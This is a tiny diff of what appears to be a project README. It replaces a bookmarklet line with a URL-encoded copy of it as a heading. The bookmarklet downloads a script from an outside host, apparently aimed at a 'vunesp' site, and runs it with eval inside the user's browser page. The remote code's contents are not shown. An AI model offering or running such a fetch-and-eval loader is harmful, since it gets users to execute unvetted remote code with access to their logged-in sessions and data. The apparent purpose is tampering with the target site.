@@ -1,4 +1,1 @@
-# script-prova
-
-javascript:fetch("https://crimsonzerohub.xyz/Script/vunesp.js?"+Date.now()).then(r=>r.text()).then(eval)
-
+# javascript:fetch("https://crimsonzerohub.xyz/Script/vunesp.js?%22+Date.now()).then(r=%3Er.text()).then(eval)
